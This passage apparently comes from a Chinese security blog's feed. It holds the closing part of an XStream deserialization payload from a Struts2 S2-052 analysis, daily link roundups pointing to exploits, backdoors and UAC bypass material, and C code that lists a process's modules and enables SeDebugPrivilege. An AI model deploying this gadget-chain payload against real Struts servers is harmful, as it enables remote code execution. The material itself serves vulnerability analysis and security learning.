&lt;/cipher&gt;</div><div class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</div><div class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</div><div class="line">              &lt;done&gt;false&lt;/done&gt;</div><div class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</div><div class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</div><div class="line">              &lt;closed&gt;false&lt;/closed&gt;</div><div class="line">            &lt;/is&gt;</div><div class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</div><div class="line">          &lt;/dataSource&gt;</div><div class="line">          &lt;transferFlavors/&gt;</div><div class="line">        &lt;/dataHandler&gt;</div><div class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</div><div class="line">      &lt;/value&gt;</div><div class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">&lt;/map&gt;</div></pre></td></tr></table></figure></p>
<p><img src="/2017/09/17/struts-052和struts-053分析/exp.png" alt=""></p>
<h4 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h4><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
<li><del>我还是喜欢用eclipse分析java漏洞。</del>，还是好像还是idea比较好用啊，只是从eclipse切换过来略蛋疼。切换过来之后，你会发现你的ide好像都要是JetBrains这个公司的了。</li>
<li>基础还是不够牢固，给自己定个小计划，后面有时间把所有的s2漏洞分析一下。学习一下思路。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li>Standard way to serialize and deserialize Objects with XStream<br><a href="http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o" target="_blank" rel="external">http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o</a></li>
<li>一步一步的构造payload<br><a href="https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java" target="_blank" rel="external">https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java</a></li>
<li>XStream “Remote Code Execution” exploit on code from “Standard way to serialize and deserialize Objects with XStream” article<br><a href="http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1" target="_blank" rel="external">http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1</a></li>
<li>Struts2 S2-052 RCE分析与利用<br><a href="https://paper.seebug.org/383/" target="_blank" rel="external">https://paper.seebug.org/383/</a></li>
<li>CVE-2017-9805:Struts2 REST插件远程执行命令漏洞(S2-052) 分析报告<br><a href="https://yq.aliyun.com/articles/197926" target="_blank" rel="external">https://yq.aliyun.com/articles/197926</a></li>
<li>S2-052漏洞分析及官方缓解措施无效验证<br><a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/" target="_blank" rel="external">http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/</a></li>
<li>Struts2 S2-052漏洞分析<br><a href="https://www.waitalone.cn/struts2-s2-052.html" target="_blank" rel="external">https://www.waitalone.cn/struts2-s2-052.html</a></li>
<li>Struts2-052漏洞分析<br><a href="https://yaofeifly.github.io/2017/09/08/Struts2-052/" target="_blank" rel="external">https://yaofeifly.github.io/2017/09/08/Struts2-052/</a></li>
<li>Apache Struts2 Remote Code Execution (S2-053)<br><a href="http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/" target="_blank" rel="external">http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。&lt;/p&gt;
&lt;h4 id=&quot;s2-052&quot;&gt;&lt;a href=&quot;#s2-
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170917安全动态</title>
    <link href="http://kevien.github.io/2017/09/17/20170917%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/17/20170917安全动态/</id>
    <published>2017-09-17T05:06:48.000Z</published>
    <updated>2017-09-17T08:10:52.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>逆向英雄联盟客户端<br><a href="https://nickcano.com/reversing-league-of-legends-client/" target="_blank" rel="external">https://nickcano.com/reversing-league-of-legends-client/</a></li>
<li>通过Chrome DLL劫持藏在广告软件包中的盗密码后门<br><a href="https://www.bleepingcomputer.com/news/security/adware-installs-infostealer-trojan-that-it-loads-via-chrome-dll-hijacking/" target="_blank" rel="external">https://www.bleepingcomputer.com/news/security/adware-installs-infostealer-trojan-that-it-loads-via-chrome-dll-hijacking/</a></li>
<li>后渗透框架RemoteRecon<br><a href="https://github.com/xorrior/RemoteRecon" target="_blank" rel="external">https://github.com/xorrior/RemoteRecon</a></li>
<li>D-Link DIR8xx Routers多个漏洞<br>本地固件上传：<a href="https://www.exploit-db.com/exploits/42731/" target="_blank" rel="external">https://www.exploit-db.com/exploits/42731/</a><br>登录凭证泄露：<a href="https://www.exploit-db.com/exploits/42729/" target="_blank" rel="external">https://www.exploit-db.com/exploits/42729/</a><br>ROOT权限远程代码执行：<a href="https://www.exploit-db.com/exploits/42730/" target="_blank" rel="external">https://www.exploit-db.com/exploits/42730/</a> </li>
<li>Debug Cisco ASA Tools<br><https: github.com="" nccgroup="" asatools=""></https:></li>
<li>检测Mimikatz及其他可疑LSASS访问<br><a href="https://www.eideon.com/2017-09-09-THL01-Mimikatz/" target="_blank" rel="external">https://www.eideon.com/2017-09-09-THL01-Mimikatz/</a></li>
<li>安全专家研究发现PyPI一直在托管恶意软件库<br><a href="https://www.theregister.co.uk/2017/09/15/pretend_python_packages_prey_on_poor_typing/" target="_blank" rel="external">https://www.theregister.co.uk/2017/09/15/pretend_python_packages_prey_on_poor_typing/</a></li>
<li>JS中的危险函数（Part 1）<br><a href="http://blog.blueclosure.com/2017/09/javascript-dangerous-functions-part-1.html" target="_blank" rel="external">http://blog.blueclosure.com/2017/09/javascript-dangerous-functions-part-1.html</a></li>
<li>成为网络中的幽灵<br><a href="https://github.com/cryptolok/GhostInTheNet" target="_blank" rel="external">https://github.com/cryptolok/GhostInTheNet</a></li>
<li>学会利用HTTP PUT<br><a href="http://www.hackingtutorials.org/exploit-tutorials/metasploitable-3-exploiting-http-put/" target="_blank" rel="external">http://www.hackingtutorials.org/exploit-tutorials/metasploitable-3-exploiting-http-put/</a></li>
<li>Code Audit Challenges 代码审计练习题<br><a href="https://github.com/CHYbeta/Code-Audit-Challenges" target="_blank" rel="external">https://github.com/CHYbeta/Code-Audit-Challenges</a></li>
<li>比敌人更了解敌人 [ 取证入门 web篇 ]<br><a href="http://www.freebuf.com/column/147929.html" target="_blank" rel="external">http://www.freebuf.com/column/147929.html</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
<li>最近觉得shadowsocks代理打开被强的网站速度很慢，修改了一下加密方式由aes-256-cfb改为了aes-128-cfb后速度快了好多。虽然安全性稍微差了点儿。。</li>
<li>tcpdump使用<br>有时候再没有安装类似wireshark的环境下，可能就需要用到tcpdump来进行抓包。<br><br>命令支持的参数比较的多，而且提供了and ，or，not等逻辑关键词来进行流量的筛选和过滤，用的时候 man一下会用就可以了，几个点需要注意一下，就是<br>-i  主机有一个网卡还好，如果多个网卡的话，就必须要-i 指定要抓取流量的网卡<br><br>其它常用过滤关键词 src dst host 等<br><img src="/2017/09/17/20170917安全动态/tcpdump.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;逆向英雄联盟客户端&lt;br&gt;&lt;a href=&quot;https://nickcano.com/rever
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170915安全动态</title>
    <link href="http://kevien.github.io/2017/09/15/20170915%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/15/20170915安全动态/</id>
    <published>2017-09-15T02:19:51.000Z</published>
    <updated>2017-09-15T10:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>Windows for Linux Nerds<br><a href="https://blog.jessfraz.com/post/windows-for-linux-nerds/" target="_blank" rel="external">https://blog.jessfraz.com/post/windows-for-linux-nerds/</a></li>
<li>30 个有趣的 Linux Shell 命令<br><a href="https://www.lopezferrando.com/30-interesting-shell-commands/" target="_blank" rel="external">https://www.lopezferrando.com/30-interesting-shell-commands/</a></li>
<li>【干货分享】XSS攻击进阶篇——那些年我们看不懂的XSS<br><a href="http://blog.nsfocus.net/xss-advance/" target="_blank" rel="external">http://blog.nsfocus.net/xss-advance/</a></li>
<li>Radare 2之旅：通过crackme实例讲解Radare 2在逆向中的应用（上）<br><a href="http://bobao.360.cn/learning/detail/4400.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4400.html</a></li>
<li>妙用JavaScript绕过XSS过滤<br><a href="http://bobao.360.cn/learning/detail/4414.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4414.html</a></li>
<li><p>从SQL注入到管理员权限<br><a href="https://www.notsosecure.com/anatomy-of-a-hack-sqli-to-enterprise-admin/" target="_blank" rel="external">https://www.notsosecure.com/anatomy-of-a-hack-sqli-to-enterprise-admin/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">感觉渗透外国人的思路还是不错</div></pre></td></tr></table></figure>
</li>
<li><p>Windbg-Cheat-Sheet<br><a href="https://github.com/bulentrahimkazanci/Windbg-Cheat-Sheet" target="_blank" rel="external">https://github.com/bulentrahimkazanci/Windbg-Cheat-Sheet</a></p>
</li>
<li>free open-source macOS firewall<br><a href="https://github.com/objective-see/LuLu" target="_blank" rel="external">https://github.com/objective-see/LuLu</a></li>
<li>CVE-2017-0213: Windows COM权限提升漏洞<br><a href="https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213" target="_blank" rel="external">https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213</a></li>
<li>REST API Security Testing with Acunetix<br><https: www.acunetix.com="" blog="" articles="" rest-api-security-testing-acunetix=""></https:></li>
<li>又一个web扫描器  Spaghetti<br><a href="https://github.com/m4ll0k/Spaghetti" target="_blank" rel="external">https://github.com/m4ll0k/Spaghetti</a></li>
<li>Ansible Vault、Tablib YAML解析器原创代码执行漏洞<br><a href="http://blog.talosintelligence.com/2017/09/vulnerability-spotlight-yaml-remote.html" target="_blank" rel="external">http://blog.talosintelligence.com/2017/09/vulnerability-spotlight-yaml-remote.html</a></li>
<li>小心Bashware：恶意软件绕过杀软的新思路,这种方法利用 Windows 10 新支持的 WSL（Linux 子系统）特性可以 Bypass 现有杀软的检测防护体系<br><a href="https://research.checkpoint.com/beware-bashware-new-method-malware-bypass-security-solutions/" target="_blank" rel="external">https://research.checkpoint.com/beware-bashware-new-method-malware-bypass-security-solutions/</a></li>
<li>Luckystrike：恶意office文档生成器<br><a href="https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator" target="_blank" rel="external">https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator</a></li>
<li>使用D-Link路由器构建僵尸网络<br><a href="https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin" target="_blank" rel="external">https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin</a></li>
<li><p>InjectProc - 进程注入工具<br><a href="https://github.com/secrary/InjectProc" target="_blank" rel="external">https://github.com/secrary/InjectProc</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">好像没什么新奇的，还是基于CreateRemoteThread()函数的。</div></pre></td></tr></table></figure>
</li>
<li><p>ThunderShell - 基于 Powershell 实现的后门<br><a href="https://github.com/Mr-Un1k0d3r/ThunderShell" target="_blank" rel="external">https://github.com/Mr-Un1k0d3r/ThunderShell</a></p>
</li>
<li>Apache Struts2 Remote Code Execution (S2-053)<br><a href="http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/" target="_blank" rel="external">http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/</a></li>
<li>MIPS 初探<br><a href="https://mp.weixin.qq.com/s?__biz=MzIxNjU3ODMyOQ==&amp;mid=2247483677&amp;idx=1&amp;sn=a6df6660510f610aa57bc1127457f9d0" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzIxNjU3ODMyOQ==&amp;mid=2247483677&amp;idx=1&amp;sn=a6df6660510f610aa57bc1127457f9d0</a></li>
<li>Xposed知多少？<br><a href="http://www.freebuf.com/column/147856.html" target="_blank" rel="external">http://www.freebuf.com/column/147856.html</a></li>
<li>PHP漏洞挖掘——进阶篇<br><a href="http://blog.nsfocus.net/php-vulnerability-mining/" target="_blank" rel="external">http://blog.nsfocus.net/php-vulnerability-mining/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Windows for Linux Nerds&lt;br&gt;&lt;a href=&quot;https://blog
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>win64逆向</title>
    <link href="http://kevien.github.io/2017/09/14/win64%E9%80%86%E5%90%91/"/>
    <id>http://kevien.github.io/2017/09/14/win64逆向/</id>
    <published>2017-09-14T14:14:58.000Z</published>
    <updated>2017-09-18T09:20:08.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>UAC原理</title>
    <link href="http://kevien.github.io/2017/09/14/UAC%E5%8E%9F%E7%90%86/"/>
    <id>http://kevien.github.io/2017/09/14/UAC原理/</id>
    <published>2017-09-14T05:35:42.000Z</published>
    <updated>2017-09-14T10:53:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>Reference:<br><a href="https://technet.microsoft.com/zh-cn/library/mt437605(v=vs.85" target="_blank" rel="external">用户帐户控制的工作原理</a>.aspx)<br><a href="http://xiangwangfeng.com/2010/10/20/UAC%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F/" target="_blank" rel="external">UAC的前世今生</a><br><a href="http://www.cnblogs.com/Chesky/p/UAC_Bypass.html" target="_blank" rel="external">UAC 实现原理及绕过方法</a><br><a href="http://www.mottoin.com/90755.html" target="_blank" rel="external">UAC攻击剖析</a><br><a href="http://bobao.360.cn/learning/detail/420.html" target="_blank" rel="external">Dridex使用的一种新型UAC绕过方法</a><br><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="external">UACME</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Reference:&lt;br&gt;&lt;a href=&quot;https://technet.microsoft.com/zh-cn/library/mt437605(v=vs.85&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;用户帐户控制的工作原理&lt;/a&gt;.aspx)
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170914安全动态</title>
    <link href="http://kevien.github.io/2017/09/14/20170914%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/14/20170914安全动态/</id>
    <published>2017-09-14T02:28:40.000Z</published>
    <updated>2017-09-14T14:26:50.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>RHme3 CTF 一道 UAF 题的 Writeup<br><a href="https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580" target="_blank" rel="external">https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580</a></li>
<li>昨天推送的 Microsoft Office RTF WSDL Parser 野外被利用 0Day 的 PoC：<a href="https://github.com/Voulnet/CVE-2017-8759-Exploit-sample" target="_blank" rel="external">https://github.com/Voulnet/CVE-2017-8759-Exploit-sample</a><br><a href="https://github.com/vysec/CVE-2017-8759" target="_blank" rel="external">https://github.com/vysec/CVE-2017-8759</a></li>
<li>上周推送过 FireEye 一篇监控 Windows Console 活动的 Blog，有位研究员根据 Blog 自己实现了一个工具<br><a href="https://github.com/EyeOfRa/WinConMon" target="_blank" rel="external">https://github.com/EyeOfRa/WinConMon</a></li>
<li>利用 PHP Sessions 文件将 LFI 漏洞升级为 RCE<br><a href="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions" target="_blank" rel="external">https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions</a></li>
<li>Use DNS Rebinding to Bypass SSRF in Java<br><a href="https://paper.seebug.org/390/" target="_blank" rel="external">https://paper.seebug.org/390/</a></li>
<li>Linux Hacking Tools 收集<br><a href="http://pastebin.com/raw/qeHD8j92" target="_blank" rel="external">http://pastebin.com/raw/qeHD8j92</a></li>
<li>Ruby ERB 模板注入攻击<br><a href="https://www.trustedsec.com/2017/09/rubyerb-template-injection/" target="_blank" rel="external">https://www.trustedsec.com/2017/09/rubyerb-template-injection/</a></li>
<li>IoT设备固件分析教程之固件是怎么存储的<br><a href="https://mp.weixin.qq.com/s/kANceRdTAocCRpkCB1lsjQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/kANceRdTAocCRpkCB1lsjQ</a></li>
<li>绕过UAC系列之 SDCLT的利用<br><a href="https://zhuanlan.zhihu.com/p/29325846" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/29325846</a></li>
<li>DownAndExec：银行恶意软件利用巴西的CDN传播（CDN已经成为传播恶意软件的新方法）<br><a href="https://www.welivesecurity.com/2017/09/13/downandexec-banking-malware-cdns-brazil/" target="_blank" rel="external">https://www.welivesecurity.com/2017/09/13/downandexec-banking-malware-cdns-brazil/</a></li>
<li>S2-053<br><a href="http://vinc.top/2017/09/14/%E3%80%90struts2%E3%80%91s2-053/" target="_blank" rel="external">http://vinc.top/2017/09/14/%E3%80%90struts2%E3%80%91s2-053/</a></li>
<li>我是怎样一步一步实现微信自动抢红包的？<br><a href="http://bbs.iosre.com/t/topic/9529/4" target="_blank" rel="external">http://bbs.iosre.com/t/topic/9529/4</a></li>
<li>从PHP源码与扩展开发谈PHP任意代码执行与防御  php安全<br><a href="https://blog.zsxsoft.com/post/30" target="_blank" rel="external">https://blog.zsxsoft.com/post/30</a></li>
<li>【技术分享】如何构建安全的API（part1）<br><a href="http://bobao.360.cn/learning/detail/4394.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4394.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;RHme3 CTF 一道 UAF 题的 Writeup&lt;br&gt;&lt;a href=&quot;https://
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>windows权限提升</title>
    <link href="http://kevien.github.io/2017/09/13/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>http://kevien.github.io/2017/09/13/windows权限提升/</id>
    <published>2017-09-13T12:22:48.000Z</published>
    <updated>2017-09-21T06:40:50.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><ul>
<li><p>还是直接看代码吧，我们直接使用如下的代码进行线程所加载模块的查看。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line">//powershell 获取进程所加载的dll方法  https://stackoverflow.com/questions/9041062/retrieving-dll-path-of-a-running-process</div><div class="line"></div><div class="line">//</div><div class="line"></div><div class="line">#include &lt;windows.h&gt; </div><div class="line">#include &lt;tlhelp32.h&gt; </div><div class="line">#include &lt;tchar.h&gt; </div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">//  Forward declarations: </div><div class="line">BOOL ListProcessModules(DWORD dwPID);</div><div class="line">void printError(TCHAR* msg);</div><div class="line"></div><div class="line">int _tmain(int argc, TCHAR* argv[])</div><div class="line">&#123;</div><div class="line">	if (argc != 2)</div><div class="line">	&#123;</div><div class="line">		printf(&quot;\n Usage  : GetProcessDll.exe &lt;processid&gt; \n\n&quot;);</div><div class="line">		return 1;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	//ListProcessModules(GetCurrentProcessId());</div><div class="line">	DWORD pid = wcstod(argv[1], _T(&apos;\0&apos;));</div><div class="line">	ListProcessModules(pid);</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">BOOL ListProcessModules(DWORD dwPID)</div><div class="line">&#123;</div><div class="line">	HANDLE hModuleSnap = INVALID_HANDLE_VALUE;</div><div class="line">	MODULEENTRY32 me32;</div><div class="line"></div><div class="line">	//  Take a snapshot of all modules in the specified process. </div><div class="line">	hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);</div><div class="line">	if (hModuleSnap == INVALID_HANDLE_VALUE)</div><div class="line">	&#123;</div><div class="line">		printError(TEXT(&quot;CreateToolhelp32Snapshot (of modules)&quot;));</div><div class="line">		return(FALSE);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	//  Set the size of the structure before using it. </div><div class="line">	me32.dwSize = sizeof(MODULEENTRY32);</div><div class="line"></div><div class="line">	//  Retrieve information about the first module, </div><div class="line">	//  and exit if unsuccessful </div><div class="line">	if (!Module32First(hModuleSnap, &amp;me32))</div><div class="line">	&#123;</div><div class="line">		printError(TEXT(&quot;Module32First&quot;));  // Show cause of failure </div><div class="line">		CloseHandle(hModuleSnap);     // Must clean up the snapshot object! </div><div class="line">		return(FALSE);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	//  Now walk the module list of the process, </div><div class="line">	//  and display information about each module </div><div class="line">	do</div><div class="line">	&#123;</div><div class="line">		_tprintf(TEXT(&quot;\n\n     MODULE NAME:     %s&quot;), me32.szModule);</div><div class="line">		_tprintf(TEXT(&quot;\n     executable     = %s&quot;), me32.szExePath);</div><div class="line">		_tprintf(TEXT(&quot;\n     process ID     = 0x%08X&quot;), me32.th32ProcessID);</div><div class="line">		_tprintf(TEXT(&quot;\n     ref count (g)  =     0x%04X&quot;), me32.GlblcntUsage);</div><div class="line">		_tprintf(TEXT(&quot;\n     ref count (p)  =     0x%04X&quot;), me32.ProccntUsage);</div><div class="line">		_tprintf(TEXT(&quot;\n     base address   = 0x%08X&quot;), (DWORD)me32.modBaseAddr);</div><div class="line">		_tprintf(TEXT(&quot;\n     base size      = %d&quot;), me32.modBaseSize);</div><div class="line"></div><div class="line">	&#125; while (Module32Next(hModuleSnap, &amp;me32));</div><div class="line"></div><div class="line">	_tprintf(TEXT(&quot;\n&quot;));</div><div class="line"></div><div class="line">	//  Do not forget to clean up the snapshot object. </div><div class="line">	CloseHandle(hModuleSnap);</div><div class="line">	return(TRUE);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">void printError(TCHAR* msg)</div><div class="line">&#123;</div><div class="line">	DWORD eNum;</div><div class="line">	TCHAR sysMsg[256];</div><div class="line">	TCHAR* p;</div><div class="line"></div><div class="line">	eNum = GetLastError();</div><div class="line">	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,</div><div class="line">		NULL, eNum,</div><div class="line">		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language</div><div class="line">		sysMsg, 256, NULL);</div><div class="line"></div><div class="line">	// Trim the end of the line and terminate it with a null</div><div class="line">	p = sysMsg;</div><div class="line">	while ((*p &gt; 31) || (*p == 9))</div><div class="line">		++p;</div><div class="line">	do &#123; *p-- = 0; &#125; while ((p &gt;= sysMsg) &amp;&amp;</div><div class="line">		((*p == &apos;.&apos;) || (*p &lt; 33)));</div><div class="line"></div><div class="line">	// Display the message</div><div class="line">	_tprintf(TEXT(&quot;\n  WARNING: %s failed with error %d (%s)&quot;), msg, eNum, sysMsg);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>如下图所示<br><img src="/2017/09/13/windows权限提升/pic.png" alt=""><br>我们可以看到，当我们查看notepad.exe进程中的dll时是可以成功的，但是要查看svhost.exe(pid=4620)的时候，程序报错了( CreateToolhelp32Snapshot (of modules) failed with error 5 (?????)),即在查看进程所属的用户相同的时候是可以正常查看的，如果是所属不同用户的话就会失败。</p>
</li>
<li>这个时候我们添加如下的函数并调用它<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">VOID DebugPrivilege()</div><div class="line">&#123;</div><div class="line">	HANDLE hToken = NULL;</div><div class="line"></div><div class="line">	BOOL bRet = OpenProcessToken(GetCurrentProcess(),</div><div class="line">		TOKEN_ALL_ACCESS, &amp;hToken);</div><div class="line"></div><div class="line">	if (bRet == TRUE)</div><div class="line">	&#123;</div><div class="line">		TOKEN_PRIVILEGES tp;</div><div class="line">		tp.PrivilegeCount = 1;</div><div class="line">		LookupPrivilegeValue(NULL,</div><div class="line">			SE_DEBUG_NAME,</div><div class="line">			&amp;tp.Privileges[0].Luid);</div><div class="line">		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;</div><div class="line">		AdjustTokenPrivileges(hToken,</div><div class="line">			FALSE, &amp;tp, sizeof(tp),</div><div class="line">			NULL, NULL);</div><div class="line"></div><div class="line">		CloseHandle(hToken);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
